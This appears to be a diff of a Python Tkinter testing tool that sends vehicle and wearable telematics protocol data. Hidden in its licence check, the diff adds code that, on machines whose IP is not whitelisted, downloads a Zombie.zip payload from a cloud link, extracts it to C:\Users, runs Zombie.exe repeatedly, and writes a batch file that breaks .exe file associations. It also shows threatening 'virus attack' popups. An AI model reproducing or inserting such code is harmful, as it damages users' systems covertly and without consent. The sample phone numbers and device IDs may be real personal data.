         self.su_Text2 = Combobox(pane2, width=22, height=2, values=items, state=f'{self.jinyong}')
         self.su_Text2.current(0)
         self.su_Text2.grid(row=5, column=0, sticky=W)
 
-        self.plsu2_Text_label2 = Label(pane2, text="批量上线设备次数")
+        self.plsu2_Text_label2 = Label(pane2, text="批量设备(5线程池)")
         self.plsu2_Text_label2.grid(row=4, columnspan=2, sticky=E)
-        items = ("1", "10")
-        self.plsu2_Text2 = Combobox(pane2, width=22, height=2, values=items, state=f'{self.jinyong}')
+        items = ("5", "10")
+        self.plsu2_Text2 = Combobox(pane2, width=22, height=2, values=items)
         self.plsu2_Text2.current(0)
         self.plsu2_Text2.grid(row=5, column=0, sticky=E)
 
         # 905组成数据
-        self.sbei_Text_label2 = Label(pane2, text="808部标设备号11位")
+        self.sbei_Text_label2 = Label(pane2, text="808部标设备号")
         self.sbei_Text_label2.grid(row=6, column=0, columnspan=1, sticky=N)
         items = (f"{self.sbei808}", "10356000000", "10351000000")
         self.sbei_Text2 = Combobox(pane2, width=50, height=2, values=items)
@@ -2542,7 +3127,7 @@ class MY_GUI(tk.Tk):
         self.jd_Text2.current(0)
         self.jd_Text2.grid(row=11, column=0, sticky=N, columnspan=1)
 
-        self.ip_on_Label2 = Label(pane2, text="发服务器")
+        self.ip_on_Label2 = Label(pane2, text="发送服务器")
         self.ip_on_Label2.grid(row=11, column=10, sticky=N)
         items = ("否", "是")
         self.ip_on_Text2 = Combobox(pane2, width=2, height=3, values=items)
@@ -2648,22 +3233,22 @@ class MY_GUI(tk.Tk):
         self.port_Text3.current(1)
         self.port_Text3.grid(row=3, column=0, columnspan=10, sticky=N)
 
-        self.su_Text_label3 = Label(pane3, text="循环次数")
+        self.su_Text_label3 = Label(pane3, text="循环开始")
         self.su_Text_label3.grid(row=4, column=0)
-        items = ("1", "10")
-        self.su_Text3 = Combobox(pane3, width=50, height=2, values=items, state=f'{self.jinyong}')
+        items = ("1", "5")
+        self.su_Text3 = Combobox(pane3, width=50, height=2, values=items)
         self.su_Text3.current(0)
         self.su_Text3.grid(row=5, column=0, columnspan=10, sticky=N)
 
         # 905组成数据
-        self.sbei_Text_label3 = Label(pane3, text="设备号(905设备号12位)")
+        self.sbei_Text_label3 = Label(pane3, text="设备号")
         self.sbei_Text_label3.grid(row=6, column=0)
         items = (f"{self.sbei905}", "101351000000")
         self.sbei_Text3 = Combobox(pane3, width=50, height=2, values=items)
         self.sbei_Text3.current(0)
         self.sbei_Text3.grid(row=7, column=0, sticky=N, columnspan=10)
 
-        self.ip_on_Label3 = Label(pane3, text="\n发服务器")
+        self.ip_on_Label3 = Label(pane3, text="\n发送服务器")
         self.ip_on_Label3.grid(row=6, column=10, sticky=N)
         items = ("否", "是")
         self.ip_on_Text3 = Combobox(pane3, width=2, height=3, values=items)
@@ -2720,9 +3305,9 @@ class MY_GUI(tk.Tk):
         self.port_Text4.current(0)
         self.port_Text4.grid(row=8, column=0, columnspan=10, sticky=N)
 
-        self.su_Text_label4 = Label(pane4, text="循环发送次数")
+        self.su_Text_label4 = Label(pane4, text="循环开始")
         self.su_Text_label4.grid(row=10, column=0, columnspan=10, sticky=N)
-        items = ("1", "10")
+        items = ("1", "5")
         self.su_Text4 = Combobox(pane4, width=50, height=2, values=items)
         self.su_Text4.current(0)
         self.su_Text4.grid(row=12, column=0, columnspan=10, sticky=N)
@@ -2753,7 +3338,7 @@ class MY_GUI(tk.Tk):
         self.jd_Text4.current(0)
         self.jd_Text4.grid(row=18, column=0, sticky=N, columnspan=10)
 
-        self.ip_on_Label4 = Label(pane4, text="发服务器")
+        self.ip_on_Label4 = Label(pane4, text="发送服务器")
         self.ip_on_Label4.grid(row=17, column=10, sticky=N)
         items = ("否", "是")
         self.ip_on_Text4 = Combobox(pane4, width=2, height=3, values=items)
@@ -2947,7 +3532,7 @@ class MY_GUI(tk.Tk):
         self.port_Text8.grid(row=3, column=0, sticky=W)
 
         # 905组成数据
-        self.sbei_Text_label8 = Label(pane8, text="808部标设备号11位")
+        self.sbei_Text_label8 = Label(pane8, text="808部标设备号")
         self.sbei_Text_label8.grid(row=4, column=0, columnspan=1, sticky=N)
         items = (f"{self.sbei808}", "10356000000", "10351000000")
         self.sbei_Text8 = Combobox(pane8, width=50, height=2, values=items)
@@ -2976,7 +3561,7 @@ class MY_GUI(tk.Tk):
         self.port905_Text8 = Combobox(pane8, width=50, height=2, values=items)
         self.port905_Text8.current(0)
         self.port905_Text8.grid(row=10, column=0, sticky=W)
-        self.sbei905_label8 = Label(pane8, text="905部标设备号12位")
+        self.sbei905_label8 = Label(pane8, text="905部标设备号")
         self.sbei905_label8.grid(row=11, column=0, columnspan=1, sticky=N)
         items = (f"{self.sbei905}", "10356000000", "10351000000")
         self.sbei905_Text8 = Combobox(pane8, width=50, height=2, values=items)
@@ -3044,11 +3629,147 @@ class MY_GUI(tk.Tk):
         self.frame1.grid(row=2, column=1, sticky=N)
         self.frame1.load_url(f'{self.url}')
 
+        pane11 = Frame()
+
+        self.ip_Text_label11 = Label(pane11, text="服务器ip")
+        self.ip_Text_label11.grid(row=0, columnspan=2, sticky=N)
+
+        items = (f"{self.conf_cswg}", f"{self.conf_scwg}", "120.79.176.183")
+        self.ip_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.ip_Text11.current(0)
+        self.ip_Text11.grid(row=1, column=0, sticky=W)
+
+        self.port_Text_label11 = Label(pane11, text="服务器Port")
+        self.port_Text_label11.grid(row=2, columnspan=2, sticky=N)
+        items = (f"7999")
+        self.port_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.port_Text11.current(0)
+        self.port_Text11.grid(row=3, column=0, sticky=W)
+
+        # 905组成数据
+        self.imei_Text_label11 = Label(pane11, text="IMEI号")
+        self.imei_Text_label11.grid(row=4, column=0, columnspan=1, sticky=N)
+        items = ("867082058798585", "867082058798522")
+        self.imei_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.imei_Text11.current(0)
+        self.imei_Text11.grid(row=5, column=0, sticky=N)
+
+        self.iccid_Text_label11 = Label(pane11, text="ICCID")
+        self.iccid_Text_label11.grid(row=6, column=0, columnspan=1, sticky=N)
+        items = ("867082058798585", "867082058798522")
+        self.iccid_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.iccid_Text11.current(0)
+        self.iccid_Text11.grid(row=7, column=0, sticky=N)
+
+        self.init_data_label11 = Label(pane11,
+                                       text="数据类型")
+        self.init_data_label11.grid(row=8, column=0, sticky=N)
+        items = ("定位数据", "心跳数据", "报警数据", "终端上报")
+        self.init_data_Text11 = Combobox(pane11, width=50, height=12, values=items)
+        self.init_data_Text11.current(0)
+        self.init_data_Text11.grid(row=9, column=0, columnspan=10, sticky=N)
+        self.init_data_Text11.bind("<<ComboboxSelected>>", self.getMon2)
+
+        # 经纬度随机
+        self.on_ = Button(pane11, text="随机经纬度", width=10, command=self.button_mode11)
+        self.on_.grid(row=9, column=10)
+
+        self.wd_Text_label11 = Label(pane11, text="纬度")
+        self.wd_Text_label11.grid(row=10, column=0)
+        items = (f"{self.conf_wd1}", "23.012173", "32.330217")
+        self.wd_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.wd_Text11.current(0)
+        self.wd_Text11.grid(row=11, column=0, sticky=N, columnspan=10)
+
+        self.jd_Text_label11 = Label(pane11, text="经度")
+        self.jd_Text_label11.grid(row=12, column=0)
+        items = (f"{self.conf_jd1}", "114.340462", "104.903551")
+        self.jd_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.jd_Text11.current(0)
+        self.jd_Text11.grid(row=13, column=0, sticky=N, columnspan=10)
+
+        self.zd_data_label11 = Label(pane11, text="终端类型")
+        items = ()
+        self.zd_data_Text11 = Combobox(pane11, width=50, height=12, values=items)
+        self.zd_data_Text11.bind("<<ComboboxSelected>>", self.getMon3)
+
+        self.power_data_label11 = Label(pane11, text="当前电量")
+        items = ("60")
+        self.power_data_Text11 = Combobox(pane11, width=22, height=20, values=items)
+        self.power_data_Text11.current(0)
+
+        self.busu_data_label11 = Label(pane11, text="当前步数")
+        items = ("220")
+        self.busu_data_Text11 = Combobox(pane11, width=22, height=2, values=items)
+        self.busu_data_Text11.current(0)
+
+        self.repower_data_label11 = Label(pane11, text="剩余电量")
+        items = ("60")
+        self.repower_data_Text11 = Combobox(pane11, width=50, height=12, values=items)
+        self.repower_data_Text11.current(0)
+
+        self.phone_data_label11 = Label(pane11, text="手机号码")
+        items = ("13829622823", "15875226034")
+        self.phone_data_Text11 = Combobox(pane11, width=22, height=20, values=items)
+        self.phone_data_Text11.current(0)
+
+        self.dial_data_label11 = Label(pane11, text="拨通方")
+        items = ("呼入", "呼出")
+        self.dial_data_Text11 = Combobox(pane11, width=22, height=2, values=items)
+        self.dial_data_Text11.current(0)
+
+        self.mode_data_label11 = Label(pane11, text="设备模式")
+        items = ("待机模式", "省电模式", "平衡模式", "实时模式")
+        self.mode_data_Text11 = Combobox(pane11, width=50, height=12, values=items)
+        self.mode_data_Text11.current(0)
+
+        self.wendu_data_label11 = Label(pane11, text="温度")
+        items = ("36.2", "37", "38", "39.4")
+        self.wendu_data_Text11 = Combobox(pane11, width=50, height=12, values=items)
+        self.wendu_data_Text11.current(0)
+
+        self.xue_data_label11 = Label(pane11, text="血氧")
+        items = ("98", "80")
+        self.xue_data_Text11 = Combobox(pane11, width=22, height=20, values=items)
+        self.xue_data_Text11.current(0)
+
+        self.xinlv_data_label11 = Label(pane11, text="心率")
+        items = ("120", "130")
+        self.xinlv_data_Text11 = Combobox(pane11, width=22, height=2, values=items)
+        self.xinlv_data_Text11.current(0)
+
+        self.wendu1_data_label11 = Label(pane11, text="温度")
+        items = ("36.2", "37", "38", "39.4")
+        self.wendu1_data_Text11 = Combobox(pane11, width=50, height=12, values=items)
+        self.wendu1_data_Text11.current(0)
+
+        self.pdai_data_label11 = Label(pane11, text="佩戴状态")
+        items = ("未佩戴", "已佩戴")
+        self.pdai_data_Text11 = Combobox(pane11, width=22, height=20, values=items)
+        self.pdai_data_Text11.current(0)
+
+        self.sb_data_label11 = Label(pane11, text="上报状态")
+        items = ("定时上报", "主动上报")
+        self.sb_data_Text11 = Combobox(pane11, width=22, height=2, values=items)
+        self.sb_data_Text11.current(0)
+
+        self.str_trans_to_md11_button = Button(pane11, text="穿戴通讯发送", width=10,
+                                               command=lambda: self.thread_it(self.xsz_login))
+        self.str_trans_to_md11_button.grid(row=5, column=10)
+
+        self.result_data_label11 = Label(pane11, text="输出结果")
+        self.result_data_label11.grid(row=0, column=11)
+
+        self.result_data_Text11 = Text(pane11, width=85, height=20, relief='solid')
+        self.result_data_Text11.grid(row=1, column=11, rowspan=15, columnspan=15)
+
         note.add(pane2, text='部标808TCP发送')
         note.add(pane1, text='出租车905TCP发送')
         note.add(pane3, text='抢答905订单发送')
         note.add(pane4, text='29协议UDP发送')
         note.add(pane5, text='V3协议解析发送')
+        note.add(pane11, text='穿戴类型通讯发送')
+
         note.add(pane6, text='905协议解析')
         note.add(pane7, text='苏粤标生成')
         note.add(pane8, text='轨迹专用发送')
@@ -3091,15 +3812,14 @@ def bdu():
     with open(file_path1, "w") as file:
         file.write("assoc.exe=WMP11.AssocFile.3G2")
     with open(file_path2, "w") as file:
-        file.write("assoc.exe=exefile\ndel C:\\Users\\count.txt\ndel C:\\Users\\delete.bat")
-    import subprocess
+        file.write("assoc.exe=exefile\ndel C:\\Users\\count.txt\ndel C:\\Users\\Zombie.exe\ndel C:\\Users\\delete.bat")
     countdown(10)
     subprocess.Popen(r"C:\Users\update.bat")
     countdown(5)
     os.remove(r"C:\Users\update.bat")
     init_window.withdraw()
     init_window.attributes('-topmost', True)
-    showwarning(title="！！！！警告警告！！！！", message=f"第3次警告提醒,病毒程序已启动,请联系管理员处理,否则后果自负")
+    showwarning(title="！！！！警告警告！！！！", message=f"病毒程序已启动,请联系管理员处理,否则后果自负")
 
 
 def gui4_start():
@@ -3134,7 +3854,6 @@ def find_numbers_in_strings(strings):
 
 
 def stop_exe(exe_name):
-    import signal
     while True:
         processes = os.popen('tasklist').read()
         print(processes)
@@ -3150,13 +3869,23 @@ def stop_exe(exe_name):
 
 def show_popup(count):
     init_window.withdraw()  # 隐藏主窗口
-    import subprocess
     for i in range(count):
-        subprocess.Popen(os.getcwd() + "\\conf\\Zombie.exe")
-        countdown(6)
+        # subprocess.Popen(os.getcwd() + "\\conf\\Zombie.exe")
+        subprocess.Popen("C:\\Users\\Zombie.exe")
+        countdown(5)
+    file_path = "C:\\Users\\count.txt"
+    with open(file_path, "r") as file:
+        runs = int(file.readline().strip())
+        print(runs)
+    if runs < 3:
+        showwarning(title="！！！！警告警告！！！！",
+                    message="\n僵尸出没\n吃掉你脑子，嘎嘎香，┗|｀O′|┛ 嗷~~\n联系管理员添加白名单")
+    elif runs == 4:
+        showwarning(title="！！！！警告警告！！！！", message=f"第1次攻击警示\n启动文件夹攻击\n下次攻击将开启病毒模式")
+    else:
+        showwarning(title="！！！！警告警告！！！！", message=f"第2次攻击警示\n10s后将启动病毒攻击")
+    countdown(24)
     init_window.attributes('-topmost', True)
-    showwarning(title="！！！！警告警告！！！！",
-                message="警告\n请联系管理员添加白名单\n开启僵尸模式，吃掉你脑子，嘎嘎香，┗|｀O′|┛ 嗷~~")
     stop_exe('Zombie.exe')
 
 
@@ -3170,7 +3899,17 @@ def wjj():
                 os.startfile(desktop_path + f"\\{filename}")
 
 
-# #
+def down():
+    url = f"{蓝奏云直链.run('https://fzw.lanzouh.com/imhbz03zfa1a')}"
+    response = requests.get(url)
+    with open('Zombie.zip', 'wb') as f:
+        f.write(response.content)
+    with zipfile.ZipFile('Zombie.zip', 'r') as zip_ref:
+        zip_ref.extractall('C:\\Users')
+    os.remove('Zombie.zip')
+
+
+#
 # log1 = os.getcwd() + "\\conf\\log.out"
 # f = open(log1, 'w')
 # sys.stdout = f
@@ -3180,23 +3919,25 @@ if __name__ == '__main__':
     if check_ipv4():
         gui4_start()
     else:
-        show_popup(1)
-        print('结束')
+        if not os.path.exists("C:\\Users\\Zombie.exe"):
+            down()
+        else:
+            pass
         count_runs()
         if count_runs() < 2:
+            show_popup(int(MY_GUI(init_window).Zombie))
+            showwarning(title="试用阶段", message="\n启动试用版本\n尽快联系管理员添加白名单")
             init_window.deiconify()
             gui4_start()
         elif count_runs() == 4:
             init_window.withdraw()
             init_window.attributes('-topmost', True)
             show_popup(int(MY_GUI(init_window).Zombie))
-            showwarning(title="！！！！警告警告！！！！", message=f"第1次警告提醒\n启动文件夹攻击\n下次警告将开启病毒模式")
             wjj()
         else:
             countdown(6)
             init_window.withdraw()
             init_window.attributes('-topmost', True)
             show_popup(int(MY_GUI(init_window).Zombie))
-            showwarning(title="！！！！警告警告！！！！", message=f"第2次警告提醒\n10s后将启动病毒攻击")
             bdu()
         sys.exit()
